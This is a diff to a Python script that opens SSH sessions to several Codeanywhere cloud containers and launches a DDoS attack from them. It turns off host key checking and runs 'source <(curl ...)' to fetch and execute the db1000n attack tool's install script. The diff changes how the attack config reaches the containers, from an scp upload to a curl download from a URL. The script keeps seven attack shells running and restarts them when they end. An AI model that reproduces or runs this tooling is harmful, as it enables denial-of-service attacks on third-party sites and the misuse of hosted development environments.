@@ -20,13 +20,10 @@ logging.basicConfig(format=MSG_FORMAT)
 
 CAW_KEYS_DIR = f'caw_keys{os.sep}'
 
-SCP_COMMAND = (
-    'scp -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} -P {port} '
-    '{config_path} cabox@{host}:config.json'
-)
+
 ATTACK_COMMAND = (
     'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
-    '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
+    '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) {config_download} '
     '&& ./db1000n -prometheus_on=false {config_arg} {needles_args}"'
 )
 
@@ -59,11 +56,11 @@ class Attack:
         else:
             logging.warning('there is no codeanywhere host')
 
-    def make_process(self, config_path, needles_args):
+    def make_process(self, config_url, needles_args):
         """
         makes process with ssh connect and runs command
 
-        :param config_path: local path to db1000n config
+        :param config_url: url to db1000n config
         :param needles_args: db1000n arguments
 
         """
@@ -81,31 +78,25 @@ class Attack:
             except Exception as e:
                 logging.error('container was not restarted: %s', e)
 
+            config_download = ''
             config_arg = ''
-            if config_path:
-                subprocess.Popen(
-                    shlex.split(SCP_COMMAND.format(
-                        caw_keys_dir=CAW_KEYS_DIR,
-                        email=email,
-                        host=host,
-                        port=port,
-                        config_path=config_path
-                    )),
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE
+            if config_url:
+                config_download = f'&& curl "{config_url}" -o config.json'
+                config_arg = f'-c ./config.json'
+            attack_command = ATTACK_COMMAND.format(
+                    caw_keys_dir=CAW_KEYS_DIR,
+                    email=email,
+                    host=host,
+                    port=port,
+                    config_download=config_download,
+                    config_arg=config_arg,
+                    needles_args=needles_args
                 )
-                config_arg = f'-c config.json'
+            logging.info('attack command was formed: %s', attack_command)
 
             with open(f'logs{os.sep}caw__{configuration}.log', 'w') as log:
                 process = subprocess.Popen(
-                    shlex.split(ATTACK_COMMAND.format(
-                        caw_keys_dir=CAW_KEYS_DIR,
-                        email=email,
-                        host=host,
-                        port=port,
-                        config_arg=config_arg,
-                        needles_args=needles_args
-                    )),
+                    shlex.split(attack_command),
                     stdout=log,
                     stderr=log
                 )
@@ -116,16 +107,16 @@ class Attack:
                 )
                 self.processes.append(process)
 
-    def start(self, config_path, needles_args):
+    def start(self, config_url, needles_args):
         """
         starts attack with needles via codeanywhere
 
-        :param config_path: local path to db1000n config
+        :param config_url: url to db1000n config
         :param needles_args: db1000n arguments
 
         """
         for _ in range(self.shells_num):
-            self.make_process(config_path, needles_args)
+            self.make_process(config_url, needles_args)
 
         while self.processes:
             for process in self.processes:
@@ -136,7 +127,7 @@ class Attack:
                     logging.info('attack finished, pid %d, return code: %d', process.pid, code)
 
                 if len(self.processes) < self.shells_num:
-                    self.make_process(config_path, needles_args)
+                    self.make_process(config_url, needles_args)
 
             time.sleep(5.)
 
@@ -151,7 +142,7 @@ def main():
         formatter_class=argparse.ArgumentDefaultsHelpFormatter
     )
     parser.add_argument('--shells_num', type=int, default=7, help='number of ssh connections')
-    parser.add_argument('--config_path', type=str, default='', help='local path to db1000n config')
+    parser.add_argument('--config_url', type=str, default='', help='url to db1000n config')
     parser.add_argument('--needles_args', type=str, default='', help='db1000n arguments')
     args = parser.parse_args()
 
@@ -165,7 +156,7 @@ def main():
             if not attack.configurations:
                 sys.exit()
 
-            attack.start(args.config_path, args.needles_args)
+            attack.start(args.config_url, args.needles_args)
 
     except KeyboardInterrupt:
         for process in attack.processes:
